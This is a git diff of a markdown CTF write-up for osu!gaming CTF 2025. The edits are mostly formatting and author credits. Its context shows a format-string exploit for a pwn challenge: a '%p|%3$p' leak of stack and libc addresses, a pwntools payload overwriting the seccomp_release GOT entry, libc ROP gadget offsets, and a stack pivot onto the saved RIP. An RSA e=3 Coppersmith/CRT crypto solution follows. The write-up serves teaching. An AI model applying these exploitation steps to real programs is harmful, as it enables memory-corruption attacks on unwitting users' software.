@@ -2,7 +2,7 @@
 title: osu!gaming CTF 2025
 date: 2025-10-27
 authors:
-    - samuzora
+    - samuzora, wrenches, azazo ... [add your names]
 visible: false # change this to true to view locally; change to false before pushing
 ---
 
@@ -175,7 +175,7 @@ program frees the buffers used and the seccomp filter, and exits.
 
 So, the expected format is as follows:
 
-```
+```bash
 mode (1 byte)
 padding (4 bytes)
 hash (variable-length string)
@@ -190,7 +190,7 @@ miss_count (2 bytes)
 We know that we want to target the username string. Let's write a helper
 function to pack our payload:
 
-```py
+```python
 def encode_varint(value):
     encoded = bytearray()
     while True:
@@ -250,7 +250,7 @@ partial RELRO, we can overwrite the GOT entry of `seccomp_release{:c}` to
 I used the `fmtstr_payload{:py}` function available in pwntools for most of the
 writes in this challenge.
 
-```py
+```python
 payload = construct_payload(fmtstr_payload(16, {exe.got.seccomp_release: exe.sym.main}))
 ```
 
@@ -285,7 +285,7 @@ We have a stack address in rsi, and libc address in rcx. These are accessed via
 the 1st and 3rd format string indexes respectively, according to the x86_64
 calling convention. Therefore, we can leak them with this payload:
 
-```py
+```python
 sleep(0.5)
 p.clean()
 payload = construct_payload(b"%p|%3$p")
@@ -336,7 +336,7 @@ There's a small problem though. Because the maximum length of the username is
 runs to slowly write the chain, and also try to reduce the size of the payload
 by setting `write_size="short"{:py}` in `fmtstr_payload{:py}`.
 
-```py
+```python
 pop_rdi = libc.address + 0x000000000002a3e5
 pop_rsi = libc.address + 0x000000000002be51
 pop_rdx_rcx_rbx = libc.address + 0x0000000000108b73
@@ -432,7 +432,7 @@ Finally, to trigger the chain, we need to overwrite the saved RIP and stack
 pivot to our fake stack. From the stack leak earlier, we can determine the saved
 RIP of the current stack frame in GDB, and place the following chain there:
 
-```py
+```python
 target_rip = stack_leak + 0x1218
 
 payload = construct_payload(
@@ -497,11 +497,11 @@ osu{fmtstr_in_the_b1g_2025}[[1m[34m*[0m] Got EOF while reading in interactive
 >
 > Author: wwm
 
-_written by wrench_
+_written by wrenches and azazo_
 
 We're given a relatively small source file and its output.
 
-```py
+```python
 from Crypto.Util.number import *
 
 FLAG = open("flag.txt").read()
@@ -526,11 +526,19 @@ Let's refer to the moduli as $ n_i $, the plaintexts as $ p_i | flag $, and the 
 
 The approach here is to _model_ the information we get the problem into something more mathematical. We'll want to describe it as a set of polynomials, and continue the analysis from there. Recall that in RSA with $e = 3$, we can just model it as a cubic:
 
-$$ f_i(x) = x^3 mod N $$ 
+$$ 
+
+f_i(x) = x^3 \mod N 
+
+$$ 
 
 Furthermore, accounting for our given values $c_i$ (which are given to us, and are therefore constants) we can further express our polynomial as the following, with the implication that the _root_ of this polynomial would be our flag:
 
-$$ f_i(x) = x^3 - c_i mod N $$
+$$ 
+
+f_i(x) = x^3 - c_i \mod N 
+
+$$
 
 If we do this for all $i$, we will essentially have a family of polynomials $f_1, f_2, f_3$, all with the same shared root $x$, and we can do... something with that (we'll get there when we get there).
 
@@ -540,7 +548,7 @@ We'll retrieve some values $a_i$ for each $i$, and we can finally properly model
 
 $$
 
-f_i(x) = (a_i + x)^3 - c_i mod N
+f_i(x) = (a_i + x)^3 - c_i \mod N
 
 $$
 
@@ -552,8 +560,10 @@ A brief rundown on Coppersmith: finding integer solutions to a polynomial $ f(x)
 
 For this to be done, we need to meet two requirements: we need our root $ x $ to be sufficiently small, and we also need our coefficients of the polynomial to be small as well. _Smallness_ is measured with respect to the modulus N, of course, $ x < N^1/3 $ (for this specific polynomial) is sufficient.
 
-The problem is, $ x $ is around 1200 bits, and each individual $ N_i $ is the product of two 727-bit (haha wysi wysi) primes. $ x $ is not small enough with respect to our individual $ N_i $ values for Coppersmith to be effective. If we were somehow able to construct a polynomial with a larger modulus, then it would work.
+The problem is, $ x $ is around 1200 bits, and each individual $ N_i $ is the product of two 727-bit (haha wysi wysi) primes. $ x $ is not small enough with respect to our individual $ N_i $ values for Coppersmith to be effective. If we were somehow able to construct a polynomial with a larger modulus that still retains $ flag $ as a small root, then it would work.
 
 ## CRT
+
+So let's work on constructing that larger polynomial. We want to define some cubic $ g(x) \mod \prod_{i=1}^{3} N_i $ such that our target $ flag $ root remains intact. 
 
 
